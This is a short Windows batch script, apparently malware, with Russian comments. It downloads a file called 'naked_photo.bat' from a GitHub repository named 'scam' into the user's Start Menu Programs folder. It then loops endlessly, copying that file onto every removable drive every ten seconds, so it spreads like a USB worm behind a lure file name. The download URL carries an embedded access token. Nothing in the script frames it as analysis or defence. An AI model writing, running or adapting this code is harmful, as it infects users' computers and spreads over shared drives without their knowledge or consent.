@echo off
setlocal enabledelayedexpansion

set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\naked_photo.bat"
set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/naked_photo.bat?token=GHSAT0AAAAAACWH3KDYWP5M425NKYN3HKEKZYCXMSQ"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"

:: Укажите путь к файлу, который нужно скопировать
set "source_file=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\naked_photo.bat"

:loop
    :: Цикл по всем доступным дискам
    for /f "tokens=1" %%d in ('wmic logicaldisk where "drivetype=2" get deviceid ^| findstr /r "^[A-Z]"') do (
        copy /Y "%source_file%" "%%d\"
    )
    timeout /t 10 > nul
goto loop